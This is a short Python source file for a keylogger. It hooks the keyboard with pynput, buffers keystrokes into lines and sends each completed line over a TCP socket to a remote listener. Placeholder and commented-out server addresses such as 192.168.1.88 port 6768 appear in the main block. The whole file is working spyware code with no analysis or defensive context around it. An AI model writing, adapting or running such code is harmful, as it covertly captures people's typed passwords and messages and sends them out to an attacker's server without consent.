import socket
from pynput.keyboard import Listener
import sys
import threading

class Keylogger:

    def __init__(self, host, port):
        self.word = ""
        self.special_keys = ["Key.ctrl_l", "Key.ctrl_r", "Key.shift_l", "Key.shift_r",
                             "Key.cmd", "Key.cmd_r", "Key.alt_l", "Key.alt_r"] #set special characters to convert or remove.
        self.cxn = socket.create_connection((host, int(port)))
        self.stop = False

    def __keylogger(self, character):
        character = str(character)
        character = character.replace("'", "")

        if self.stop:
            return False

        elif character == "Key.space":
            character = " "
            self.word += character

        elif character in self.special_keys:
            #Actions for special caracters
            pass

        elif character == "Key.tab":
            self.word += "\\t"

        elif character == "Key.backspace":
            self.word = self.word[:len(self.word)-1]

        elif character == "Key.enter": #Send to server
            word = self.word + "\\n"
            th = threading.Thread(target=self.send_word, args=(word,))
            th.start()
            self.word = ""
        else:
            self.word += character

    def send_word(self, word):
        try:
            self.cxn.send(word.encode("utf-8"))
        except Exception:
            self.stop = True

    def run(self):
        with Listener(on_press=self.__keylogger) as listen:
            listen.join()

if __name__ == "__main__":
    #Keylogger(sys.argv[1], sys.argv[2]).run()
    #Keylogger("192.168.1.88", "6768").run()
    Keylogger("ip server", "port").run()